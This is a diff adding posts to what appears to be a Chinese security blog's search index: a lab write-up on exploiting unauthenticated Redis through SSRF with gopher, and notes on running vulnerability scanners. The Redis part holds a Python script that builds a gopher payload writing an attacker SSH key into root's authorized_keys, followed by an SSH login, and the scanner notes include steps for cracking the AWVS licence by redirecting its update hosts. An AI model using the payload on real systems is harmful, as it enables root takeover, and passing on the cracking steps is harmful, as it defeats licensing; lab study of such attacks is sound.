+<p>使用配置文件启动redis服务端：redis-server redis.conf</p>
+<h5 id="客户端无密码登录redis"><a href="#客户端无密码登录redis" class="headerlink" title="客户端无密码登录redis"></a>客户端无密码登录redis</h5><p>redis-cli -h 目标主机IP</p>
+<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727131933205.png" alt="image-20220727131933205" style="zoom: 33%;">
+
+<p>redis内获取当前目录：config get dir</p>
+<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727132219438.png" alt="image-20220727132219438" style="zoom:33%;">
+
+<h3 id="利用gopher协议未授权访问redis"><a href="#利用gopher协议未授权访问redis" class="headerlink" title="利用gopher协议未授权访问redis"></a>利用gopher协议未授权访问redis</h3><p>利用ssrf漏洞，使用dict:&#x2F;&#x2F;可以探测是否开启6379服务</p>
+<p><a href="http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379">http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379</a></p>
+<p>一、在攻击机上生成公私钥，密码设置为空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>二、进入&#x2F;root&#x2F;.ssh目录，将生成的公钥保存到1.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>三、把1.txt内容通过Python脚本写入公钥 转化为gopher协议格式</p>
+<p><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727135438236.png" alt="image-20220727135438236"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.100.84&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCbEPsXBi9WBUKtrN3OsIzph9XAMtnZwPCI4dg/Id4yzpIBmheyplwkoPTPU0XhO61TyDMWplMnd8PKqbKkfxRl1adRxdDFZVlzQNONAtbGEE9IJeZFRA115KUm/rCuiTEwdqYQfZ+VohJcHavyJz9gjaM1DSuAAfeddCxuzqWMWaxSc13xSLUGxeBVbRLXyaXxkvlN6oEJ8ze+JEuXcn9E15mF1YvjGRRFRpIKxYAwRfNYDjin3d7dgrtlO0MNC4Geiho/NjYVuNj8y1xheYfU1dp3w7RO9h6dqzncFv/DMexjeN41Ipltswqh5FmfuuxEcTxvtKrdxsHXGSTmLbDzo598cmVKsZ+fxYIqAnxjWs+WDF1tvDLowEbJ9apIO8NmFZyVZFDHVo2cx5DrziVgknaZlfVPAMQ0WZOU0IUIMhq0r1SV5yLOYLs2COaXiS+Ra6Lspz1/Q1XjDOXkdtt1dI9dYT0nzSQzJWY6IoHHuLtNRPgNITcDr6lDu542gmM= root@kali\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>    </span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(ssh_pub.<span class="title function_ invoke__">replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(path),</span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(filename),</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.<span class="title function_ invoke__">insert</span>(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line">    </span><br><span class="line">def <span class="title function_ invoke__">redis_format</span>(arr):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.<span class="title function_ invoke__">split</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>((x.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.<span class="title function_ invoke__">quote</span>(<span class="title function_ invoke__">redis_format</span>(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ssrf.py</span><br></pre></td></tr></table></figure>
+
+<p>四、通过curl使其执行</p>
+<p>p1没有成功写入原因：服务端是kali用户起的，不是root用户。改成root用户即可成功写入 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
+<p><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727141928099.png" alt="image-20220727141928099" style="zoom: 20%;"><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727142002681.png" alt="image-20220727142002681" style="zoom:20%;"></p>
+<p>五、ssh登入目标机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.100.84</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>redis</tag>
+        <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏扫工具使用</title>
+    <url>/2022/07/29/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="aWVS"><a href="#aWVS" class="headerlink" title="aWVS"></a>aWVS</h2><p>arl-awvs.py:联合arl灯塔进行扫描</p>
+<p>用户名密码：<a href="mailto:&#x61;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#115;&#46;&#99;&#x6f;&#x6d;">&#x61;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#115;&#46;&#99;&#x6f;&#x6d;</a>&#x2F;<a href="mailto:&#x41;&#x77;&#x76;&#x73;&#x40;&#97;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#109;">&#x41;&#x77;&#x76;&#x73;&#x40;&#97;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#109;</a></p>
+<h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker search awvs</span><br><span class="line">sudo docker pull xrsec/awvs</span><br><span class="line">docker run -it -d --name awvs -p 3445:3443 --restart=always xrsec/awvs:latest</span><br></pre></td></tr></table></figure>
+
+<h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制license_info.json&amp;wa_data.dat---&gt;</span><br><span class="line">windows&gt;&gt;&gt;C:/PrpgramData/Acunetix/shared/license/</span><br><span class="line">linux&gt;&gt;&gt;/home/acunetix/.acunetix/data/license/</span><br><span class="line">mac&gt;&gt;&gt;/Applications/Acunetix.app/Contents/Resources/data/license</span><br><span class="line"></span><br><span class="line">docker&gt;&gt;&gt;docker cp license_info.json&amp;wa_data.dat---&gt; doker-id:/home/acunetix/.acunetix/data/license</span><br><span class="line"></span><br><span class="line">修改hosts文件：</span><br><span class="line">windows：C:\Windows\System32\drivers\etc</span><br><span class="line">linux:/etc/hosts</span><br><span class="line">追加：</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>针对内网资产</p>
+<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><h4 id="一、基础爬虫模式"><a href="#一、基础爬虫模式" class="headerlink" title="一、基础爬虫模式"></a>一、基础爬虫模式</h4><h6 id="1、爬虫获取链接后进行漏扫"><a href="#1、爬虫获取链接后进行漏扫" class="headerlink" title="1、爬虫获取链接后进行漏扫"></a>1、爬虫获取链接后进行漏扫</h6><p>.&#x2F;xray webscan –basic-crawler url -html-output a.html</p>
+<h4 id="二、使用代理模式扫描「常用」"><a href="#二、使用代理模式扫描「常用」" class="headerlink" title="二、使用代理模式扫描「常用」"></a>二、使用代理模式扫描「常用」</h4><h6 id="1、安装浏览器插件switchOmega"><a href="#1、安装浏览器插件switchOmega" class="headerlink" title="1、安装浏览器插件switchOmega"></a>1、安装浏览器插件switchOmega</h6><h6 id="2、启动xray，使用命令生成证书：xray-exe-genca"><a href="#2、启动xray，使用命令生成证书：xray-exe-genca" class="headerlink" title="2、启动xray，使用命令生成证书：xray.exe genca"></a>2、启动xray，使用命令生成证书：xray.exe genca</h6><h6 id="3、安装并信任生成的证书"><a href="#3、安装并信任生成的证书" class="headerlink" title="3、安装并信任生成的证书"></a>3、安装并信任生成的证书</h6><h6 id="4、启动xray代理：第一次启动，当前目录会生成config-yml"><a href="#4、启动xray代理：第一次启动，当前目录会生成config-yml" class="headerlink" title="4、启动xray代理：第一次启动，当前目录会生成config.yml"></a>4、启动xray代理：第一次启动，当前目录会生成config.yml</h6><p>mitm中restriction中hostname_allowed增加testphp.vulnweb.com<br>.&#x2F;xray webscan –listen 127.0.0.1:7777 –html-output pro.html<br>网页代理选择http 127.0.0.1:7777</p>
+<h2 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a>nuclei</h2><p>安装目录在&#x2F;usr&#x2F;local&#x2F;bin下</p>
+<p>github安装使用&#x2F;docker</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/projectdiscovery/nuclei-templates</span><br><span class="line">tar -xzvf nuclei-linux-amd64.tar</span><br><span class="line">mv nuclei-linux-amd64 /usr/bin/nuclei</span><br><span class="line">nuclei -h</span><br></pre></td></tr></table></figure>
+
+<h6 id="单个目标扫描"><a href="#单个目标扫描" class="headerlink" title="单个目标扫描"></a>单个目标扫描</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nuclei -u http://192.168.204.179</span><br></pre></td></tr></table></figure>
+
+<h6 id="多个目标扫描"><a href="#多个目标扫描" class="headerlink" title="多个目标扫描"></a>多个目标扫描</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nuclei -list http_urls.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="自定义模板目录或多个模板目录"><a href="#自定义模板目录或多个模板目录" class="headerlink" title="自定义模板目录或多个模板目录"></a>自定义模板目录或多个模板目录</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nuclei -u http://192.168.204.179/dvwa/login.php -t default-logins/</span><br></pre></td></tr></table></figure>
+
+<h6 id="支持过滤器"><a href="#支持过滤器" class="headerlink" title="支持过滤器"></a>支持过滤器</h6><p>只想扫描高危漏洞：-serverity critical,high</p>
+<h2 id="scan4all"><a href="#scan4all" class="headerlink" title="scan4all"></a>scan4all</h2><p>集成vscan、nuclei、ksubdomain、subfinder等，全自动化、智能化的渗透测试工具</p>
+<p>安装库：sudo apt install -y libpcap-dev golang git</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scan4all -host 192.168.204.179</span><br></pre></td></tr></table></figure>
+
+<h2 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a>afrog</h2><p>PoC支持CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型</p>
+<h6 id="扫描单个目标"><a href="#扫描单个目标" class="headerlink" title="扫描单个目标"></a>扫描单个目标</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./afrog -t http://192.168.204.179</span><br></pre></td></tr></table></figure>
+
+<h6 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./afrog -T url.txt -o url.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#按PoC关键字扫描</span><br><span class="line">-s tomcat,springboot,shiro</span><br><span class="line">#按PoC漏洞等级扫描</span><br><span class="line">-S high,critical</span><br></pre></td></tr></table></figure>
+
+<h2 id="特定类型漏扫工具"><a href="#特定类型漏扫工具" class="headerlink" title="特定类型漏扫工具"></a>特定类型漏扫工具</h2><h3 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h3><p>高并发、轻量级「目标多，想迅速定位」</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/BBScan</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python BBScan.py -f urls.txt</span><br><span class="line">python BBScan.py --host www.target.com --network 28</span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp漏扫工具"><a href="#Thinkphp漏扫工具" class="headerlink" title="Thinkphp漏扫工具"></a>Thinkphp漏扫工具</h3><h3 id="Weblogic漏扫工具"><a href="#Weblogic漏扫工具" class="headerlink" title="Weblogic漏扫工具"></a>Weblogic漏扫工具</h3>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+</search>
